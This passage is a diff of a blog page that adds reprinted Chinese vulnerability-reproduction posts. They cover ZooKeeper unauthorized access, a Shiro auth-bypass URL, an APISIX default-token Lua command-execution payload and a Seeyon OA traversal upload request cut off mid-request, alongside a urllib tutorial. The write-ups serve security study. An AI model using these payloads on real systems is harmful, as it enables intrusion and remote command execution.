@@ -82,6 +82,454 @@
 
     
         <h2 class="title">
+            <a href="/2023/12/06/CVE-2014-085-ZooKeeper/">
+                ZooKeeper 未授权访问漏洞（CVE-2014-085） 复现
+            </a>
+        </h2>
+    
+    <time>
+        Dec 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="zookeeper-未授权访问漏洞cve-2014-085-复现">ZooKeeper 未授权访问漏洞（CVE-2014-085） 复现</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44108455/article/details/107708133">gclome</a> 并作补充</p>
+<p>最近想收集一下近几年的通用型漏洞，然后就找到了这个漏洞，那就先来这个漏洞吧！</p>
+</blockquote>
+<h2><span id="zookeeper未授权访问漏洞是什么">ZooKeeper未授权访问漏洞是什么</span></h2><blockquote>
+<p>ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。</p>
+<p>ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境</p>
+</blockquote>
+<h2><span id="漏洞原因">漏洞原因</span></h2><blockquote>
+<p>默认安装配置完的zookeeper允许未授权访问，管理员未配置访问控制列表（ACL）。导致攻击者可以在默认开放的2181端口下通过执行envi命令获得大量敏感信息（系统名称、java环境）导致任意用户可以在网络不受限的情况下进行未授权访问读取数据甚至杀死服务。</p>
+<p>（原因如下：默认的ACL中未进行限制访问）</p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/1.png" alt="image"></p>
+<p>用于访问控制的模式有：<br>（1）world 代表任何用户<br>（2）auth 不使用任何id，代表任何已经认证过的用户<br>（3）digest 使用username:password认证，password使用md5哈希之后base64再编码，现改成了sha1加密。<br>（4）ip 用客户端的ip作为ACL的标识。</p>
+</blockquote>
+<h2><span id="环境搭建">环境搭建</span></h2><blockquote>
+<p>测试机： Kali （192.168.133.134）<br>靶机： Kali（192.168.133.132）<br>版本：zookeeper-3.4.14</p>
+<p>分别在测试机和靶机都安装zookeeper-3.4.14<br>安装命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#搭建环境</span></span><br><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz</span><br><span class="line">tar -xzvf zookeeper-3.4.14.tar.gz </span><br><span class="line"><span class="built_in">cd</span> zookeeper-3.4.14/conf</span><br><span class="line"><span class="built_in">mv</span> zoo_sample.cfg zoo.cfg</span><br><span class="line">../bin/zkServer.sh start <span class="comment"># 启动</span></span><br></pre></td></tr></table></figure>
+
+<p>搭建成功 默认端口是2181</p>
+</blockquote>
+<h2><span id="漏洞证明">漏洞证明</span></h2><blockquote>
+<p>尝试连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./zkCli.sh -server  192.168.133.132 2181</span><br></pre></td></tr></table></figure>
+
+<p>如下图，连接成功</p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/2.png" alt="image"></p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/3.png" alt="image"></p>
+<p>并且存在此漏洞！</p>
+<p>获取该服务器的环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> envi|nc 192.168.133.132 2181</span><br></pre></td></tr></table></figure>
+
+<p>通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。</p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/4.png" alt="image"></p>
+</blockquote>
+<h2><span id="漏洞利用">漏洞利用</span></h2><h3><span id="part1">part1</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stat</span>：列出关于性能和连接的客户端的统计信息。</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">stat</span> |nc 192.168.133.132 2181</span><br><span class="line"></span><br><span class="line">ruok：测试服务器是否运行在非错误状态。</span><br><span class="line"><span class="built_in">echo</span> ruok |nc 192.168.133.132 2181</span><br><span class="line"></span><br><span class="line">reqs：列出未完成的请求。</span><br><span class="line"><span class="built_in">echo</span> reqs |nc 192.168.133.132 2181</span><br><span class="line"></span><br><span class="line">envi：打印有关服务环境的详细信息。</span><br><span class="line"><span class="built_in">echo</span> envi |nc 192.168.133.132 2181</span><br><span class="line"></span><br><span class="line">dump：列出未完成的会话和临时节点。</span><br><span class="line"><span class="built_in">echo</span> dump |nc 192.168.133.132 2181</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/5.png" alt="image"></p>
+</blockquote>
+<h3><span id="part2">part2</span></h3><blockquote>
+<p>我们在zk的客户端可以进行节点权限的查看和设置。</p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/6.png" alt="image"></p>
+<p>从上述操作可以看出，zk新创建的znode默认访问方式为world。我们通过addauth和setAcl给&#x2F;test节点设置访问权限为digest，操作权限为cdrwa，用户名为user，密码为password。</p>
+<p>当然，我们使用getAcl是无法获取可访问用户test的明文密码的（要是可以获取明文密码，不又是个漏洞嘛~~）。</p>
+<p>另启zk客户端，执行ls &#x2F;test,发现当前用户已经无法访问&#x2F;test节点，提示信息为“Authentication is not valid”。解决方法就是addauth添加认证用户了，并且必须使用用户名和密码明文进行认证。</p>
+<p>addauth添加digest认证用户user后，即可正常访问&#x2F;test节点了。</p>
+<p>另外，还有一点需要注意，znode的ACL是相互独立的。也就是说，任意不同节点可以用不同的acl列表，互不影响，并且ACL是不可被继承的。</p>
+<p>我们在&#x2F;test下创建leaf节点，可发现，leaf节点的认证方式为world，即任何用户都有访问权限。</p>
+</blockquote>
+<h4><span id="利用zookeeper可视化管理工具进行连接">利用zookeeper可视化管理工具进行连接</span></h4><blockquote>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip">https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip</a></p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/7.png" alt="image"></p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/8.png" alt="image"></p>
+</blockquote>
+<h2><span id="修复方案">修复方案</span></h2><blockquote>
+<p>禁止把Zookeeper直接暴露在公网</p>
+<p>添加访问控制，根据情况选择对应方式（认证用户，用户名密码，指定IP）</p>
+<p>配置防火墙策略，只允许指定IP访问2181端口</p>
+<p>配置服务ACL限制IP访问</p>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011721501/article/details/44062617">https://blog.csdn.net/u011721501/article/details/44062617</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0nc3/p/12071281.html">https://www.cnblogs.com/0nc3/p/12071281.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6103#toc-7">https://xz.aliyun.com/t/6103#toc-7</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Aaron_Miller/article/details/106049421">https://blog.csdn.net/Aaron_Miller/article/details/106049421</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ilovena/p/9484522.html">https://www.cnblogs.com/ilovena/p/9484522.html</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/ZooKeeper/" rel="tag">ZooKeeper</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/06/CVE-2020-1957-Apache-Shiro/">
+                Apache Shiro 认证绕过漏洞 CVE-2020-1957 漏洞复现
+            </a>
+        </h2>
+    
+    <time>
+        Dec 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="apache-shiro-认证绕过漏洞-cve-2020-1957-漏洞复现">Apache Shiro 认证绕过漏洞 CVE-2020-1957 漏洞复现</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/119105197">Senimo_</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。<br>CVE-2020-1957，Spring Boot中使用 Apache Shiro 进行身份验证、权限控制时，可以精心构造恶意的URL，利用 Apache Shiro 和 Spring Boot 对URL的处理的差异化，可以绕过 Apache Shiro 对 Spring Boot 中的 Servlet 的权限控制，越权并实现未授权访问。</p>
+</blockquote>
+<h2><span id="漏洞影响">漏洞影响</span></h2><h3><span id="环境搭建">环境搭建</span></h3><blockquote>
+<p>执行如下命令启动一个搭载Spring 2.2.2与Shiro 1.5.1的应用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/shiro/CVE-2020-1957</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+
+
+<p>环境启动后，访问<code>http://x.x.x.x:8080</code>即可查看首页:</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/1.png" alt="image"></p>
+<p>这个应用中对URL权限的配置如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> ShiroFilterChainDefinition <span class="title function_">shiroFilterChainDefinition</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">DefaultShiroFilterChainDefinition</span> <span class="variable">chainDefinition</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultShiroFilterChainDefinition</span>();</span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">&quot;/login.html&quot;</span>, <span class="string">&quot;authc&quot;</span>); <span class="comment">// need to accept POSTs from the login form</span></span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">&quot;/logout&quot;</span>, <span class="string">&quot;logout&quot;</span>);</span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">&quot;/admin/**&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> chainDefinition;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="漏洞复现">漏洞复现</span></h3><blockquote>
+<p>使用BurpSuite抓取数据包，访问<code>/admin/</code>目录：</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/2.png" alt="image"></p>
+<p>回显<code>302</code>并跳转到登录页面：</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/3.png" alt="image"></p>
+<p>构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面：</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/4.png" alt="image"></p>
+<p>URL请求过程：</p>
+<ul>
+<li>客户端请求URL: <code>/xxx/..;/admin/</code></li>
+<li>Shrio 内部处理得到校验URL为 <code>/xxxx/..</code>,校验通过</li>
+<li>SpringBoot 处理 <code>/xxx/..;/admin/</code> , 最终请求 <code>/admin/</code>, 成功访问了后台请求。</li>
+</ul>
+</blockquote>
+<h2><span id="漏洞poc">漏洞POC</span></h2><blockquote>
+<p>构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面。</p>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.safedog.cn/news.html?id=4441">https://www.safedog.cn/news.html?id=4441</a><br><a target="_blank" rel="noopener" href="https://blog.spoock.com/2020/05/09/cve-2020-1957/">https://blog.spoock.com/2020/05/09/cve-2020-1957/</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/06/CVE-2020-13945-Apache-APISIX/">
+                Apache APISIX 默认密钥漏洞（CVE-2020-13945）
+            </a>
+        </h2>
+    
+    <time>
+        Dec 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="apache-apisix-默认密钥漏洞cve-2020-13945">Apache APISIX 默认密钥漏洞（CVE-2020-13945）</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/horistttt/article/details/124344871">horisMMM</a> 并作补充</p>
+</blockquote>
+<h2><span id="apisix简介">APISIX简介</span></h2><blockquote>
+<p>官方一句话介绍：Apache APISIX是一个高性能API网关。</p>
+<p>API网关又是什么？</p>
+<p>百度：API网关，软件术语，两个相互独立的局域网之间通过路由器进行通信，中间的路由被称之为网关。</p>
+<p>任何一个应用系统如果需要被其他系统调用，就需要暴露 API，这些 API 代表着一个一个的功能点。</p>
+<p>如果两个系统中间通信，在系统之间加上一个中介者协助 API 的调用，这个中介者就是 API 网关。</p>
+<p>那意思就是Apisix是两个系统的一个中介，可以使用这个中间管理系统API。</p>
+</blockquote>
+<h2><span id="存在漏洞">存在漏洞</span></h2><blockquote>
+<p>在用户未指定管理员Token或使用了默认配置文件的情况下，Apache APISIX将使用默认的管理员Token edd1c9f034335f136f87ad84b625c8f1，攻击者利用这个Token可以访问到管理员接口，进而通过script参数来插入任意LUA脚本并执行。</p>
+<p>意思就是有一个默认的Token，可以直接得到管理员权限，并插入攻击脚本。</p>
+</blockquote>
+<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
+<p>docker-compose up -d 搭建环境</p>
+<p>docker ps 查看端口为9080</p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/1.png" alt="image"></p>
+<p>访问 127.0.0.1&#x2F;asixpix&#x2F;admin&#x2F;routes,显示token不正确</p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/2.png" alt="image"></p>
+<p>抓这个包，把方法改为POST，加上X-API-KEY: edd1c9f034335f136f87ad84b625c8f1，加上payload</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;uri&quot;: &quot;/attack&quot;,</span><br><span class="line">&quot;script&quot;: &quot;local _M = &#123;&#125; \n function _M.access(conf, ctx) \n local os = require(&#x27;os&#x27;)\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, &#x27;r&#x27;))\n local s = assert(f:read(&#x27;*a&#x27;))\n ngx.say(s)\n f:close()  \n end \nreturn _M&quot;,</span><br><span class="line">    &quot;upstream&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;roundrobin&quot;,</span><br><span class="line">        &quot;nodes&quot;: &#123;</span><br><span class="line">            &quot;example.com:80&quot;: 1</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/3.png" alt="image"></p>
+<p>然后，我们访问刚才添加的router，就可以通过cmd参数执行任意命令：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9080/attack?cmd=id</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/4.png" alt="image"></p>
+</blockquote>
+<h2><span id="payload分析">payload分析</span></h2><blockquote>
+<p>查看官方文档，观察创建路由的方法</p>
+<p><a target="_blank" rel="noopener" href="https://apisix.apache.org/zh/docs/apisix/getting-started/">https://apisix.apache.org/zh/docs/apisix/getting-started/</a></p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/5.png" alt="image"></p>
+<p>与payload对比，发现payload格式与官方创建路由一致，只是利用script插入了一段lua恶意脚本。</p>
+<p>在 Apache APISIX 中，我们在 Route 实体中新增了 script 执行逻辑，可用于接收 Dashboard 生成的 Lua 函数并执行，它支持调用已有插件以复用代码。另外，它也作用于 HTTP 请求的生命周期中的各个阶段，如 access、header_filer、body_filter 等，系统会在相应阶段自动执行 script 函数对应阶段代码<br><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/6.png" alt="image"></p>
+<p>接下来对lua脚本进行分析,\n是换行</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> _M = &#123;&#125; \n <span class="function"><span class="keyword">function</span> <span class="title">_M.access</span><span class="params">(conf, ctx)</span></span>//在access阶段进行处理，检查如果达到的不健康次数超过了配置的最大次数，则就被<span class="keyword">break</span>掉。这里没找到看得懂的资料。</span><br><span class="line"><span class="keyword">local</span> <span class="built_in">os</span> = <span class="built_in">require</span>(<span class="string">&#x27;os&#x27;</span>)//加载<span class="built_in">os</span>模块，用于进行文件操作</span><br><span class="line"><span class="keyword">local</span> args = <span class="built_in">assert</span>(ngx.req.get_uri_args()) //<span class="built_in">assert</span>()是断言，类似于try(),这里是获取uri中给的参数。</span><br><span class="line"><span class="keyword">local</span> f = <span class="built_in">assert</span>(<span class="built_in">io</span>.<span class="built_in">popen</span>(args.cmd, <span class="string">&#x27;r&#x27;</span>))//<span class="built_in">io</span>.<span class="built_in">popen</span>()用于执行系统命令,<span class="string">&#x27;r&#x27;</span>是模式</span><br><span class="line"><span class="keyword">local</span> s = <span class="built_in">assert</span>(f:<span class="built_in">read</span>(<span class="string">&#x27;*a&#x27;</span>))//读取全部内容</span><br><span class="line">ngx.say(s)//输出，还有一种方法是ngx.<span class="built_in">print</span>(),但两者有区别</span><br><span class="line">f:<span class="built_in">close</span>()</span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"><span class="keyword">return</span> _M</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>function _M.access(conf, ctx)</strong></p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/7.png" alt="image"></p>
+<p><strong>assert()</strong></p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/8.png" alt="image"></p>
+<p><strong>read(‘a’)</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013625451/article/details/78879739">https://blog.csdn.net/u013625451/article/details/78879739</a></p>
+<p><img src="/2023/12/06/CVE-2020-13945-Apache-APISIX/9.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/11/08/urllib-HTTPResponse/">
+                urllib库进行网络请求后返回的HTTPResponse对象的用法总结
+            </a>
+        </h2>
+    
+    <time>
+        Nov 8, 2023
+    </time>
+    <section class="content">
+        <h1><span id="urllib库进行网络请求后返回的httpresponse对象的用法总结">urllib库进行网络请求后返回的HTTPResponse对象的用法总结</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/topleeyap/article/details/78845946">「已注销」</a> 并作补充</p>
+</blockquote>
+<blockquote>
+<p>不管是使用urllib.request.urlopen()方法，还是使用opener.open()方法，都返回同样类型的HTTPResponse对象，用法总结如下:</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> response</span><br><span class="line"> </span><br><span class="line">URL=<span class="string">&quot;http://www.baidu.com/&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 构造请求头信息</span></span><br><span class="line"><span class="comment"># 反反爬虫:设置User-Agent</span></span><br><span class="line">request_headers=&#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 构造请求对象,并添加请求头</span></span><br><span class="line">req=request.Request(URL,headers=request_headers)</span><br><span class="line"><span class="comment"># 发起请求</span></span><br><span class="line">resp=request.urlopen(req)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(resp))   <span class="comment"># &lt;class &#x27;http.client.HTTPResponse&#x27;&gt;</span></span><br><span class="line"><span class="comment"># 获取HTTP协议版本号(10 for HTTP/1.0, 11 for HTTP/1.1)</span></span><br><span class="line"><span class="built_in">print</span>(resp.version)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取响应码</span></span><br><span class="line"><span class="built_in">print</span>(resp.status)</span><br><span class="line"><span class="built_in">print</span>(resp.getcode())</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取响应描述字符串</span></span><br><span class="line"><span class="built_in">print</span>(resp.reason)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取实际请求的页面url(防止重定向用)</span></span><br><span class="line"><span class="built_in">print</span>(resp.geturl())</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取特定响应头信息</span></span><br><span class="line"><span class="built_in">print</span>(resp.getheader(name=<span class="string">&quot;Content-Type&quot;</span>))</span><br><span class="line"><span class="comment"># 获取响应头信息,返回二元元组列表</span></span><br><span class="line"><span class="built_in">print</span>(resp.getheaders())</span><br><span class="line"><span class="comment"># 获取响应头信息,返回字符串</span></span><br><span class="line"><span class="built_in">print</span>(resp.info())</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 读取响应体</span></span><br><span class="line"><span class="built_in">print</span>(resp.readline().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(resp.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/Python/" rel="tag">Python</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/11/08/Apktool-URL/">
+                提取APK中的URL地址
+            </a>
+        </h2>
+    
+    <time>
+        Nov 8, 2023
+    </time>
+    <section class="content">
+        <h1><span id="提取apk中的url地址">提取APK中的URL地址</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/Aaron_Miller/article/details/108759583">風月长情</a> 并作补充</p>
+</blockquote>
+<h2><span id="一-目的">一、目的</span></h2><blockquote>
+<p>客户端渗透测试前期信息收集过程中可以在APK中检索开发过程中没有删掉的URL地址，在这些地址中可能会发现后台、搜索引擎、子域名查找不到的一些资源。</p>
+</blockquote>
+<h2><span id="二-操作">二、操作</span></h2><blockquote>
+<p>反编译APK文件<br><code>apktool d &lt;xxx.apk&gt;</code><br>将反编译的文件zip打包发送到linux系统中<br><img src="/2023/11/08/Apktool-URL/1.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>使用grep命令进行URL正则匹配<br>通过grep正则匹配包下边所有文件的uri地址，然后排序，删除重复行，最后重定向到文件中<br><code>grep -ohr -E &quot;https?://[a-zA-Z0-9\.\/_&amp;=@$%?~#-]*&quot; /Kevin/com.sogou.map.android.maps/ |sort|uniq &gt;&gt; test.txt</code><br><img src="/2023/11/08/Apktool-URL/2.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>然后在搜索出来的地址中查看是否有敏感地址：<br>比如这个地址就不在我搜索的上千个子域中：<br><img src="/2023/11/08/Apktool-URL/3.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>随便一试直接进入后台，到此文件上传拿shell一个高危漏洞又到手了，香吧~<br><img src="/2023/11/08/Apktool-URL/4.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apktool/" rel="tag">Apktool</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/11/08/Upload-Seeyon/">
+                致远OA wpsAssistServlet 任意文件上传漏洞 漏洞复现
+            </a>
+        </h2>
+    
+    <time>
+        Nov 8, 2023
+    </time>
+    <section class="content">
+        <h1><span id="致远oa-wpsassistservlet-任意文件上传漏洞-漏洞复现">致远OA wpsAssistServlet 任意文件上传漏洞 漏洞复现</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq2539879928/article/details/127811791">Vista、</a> 并作补充</p>
+</blockquote>
+<h2><span id="01-漏洞描述">01 漏洞描述</span></h2><blockquote>
+<p>致远OA是一套办公协同管理软件。致远OA wpsAssistServlet接口存在任意文件上传漏洞，攻击者通过漏洞可以发送特定的请求包上传恶意文件，获取服务器权限。</p>
+</blockquote>
+<h2><span id="02-影响范围">02 影响范围</span></h2><blockquote>
+<p>致远OA A6、A8、A8N (V8.0SP2，V8.1，V8.1SP1)<br>致远OA G6、G6N (V8.1、V8.1SP1)</p>
+</blockquote>
+<h2><span id="03-利用方式">03 利用方式</span></h2><blockquote>
+<p>1、调用文件上传接口上传测试文件，请求包如下：</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/seeyon/wpsAssistServlet?flag=save&amp;realFileType=../../../../ApacheJetspeed/webapps/ROOT/test.jsp&amp;fileId=2</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>349</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--59229605f98b8cf290a7b8908b34616b</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload&quot;; 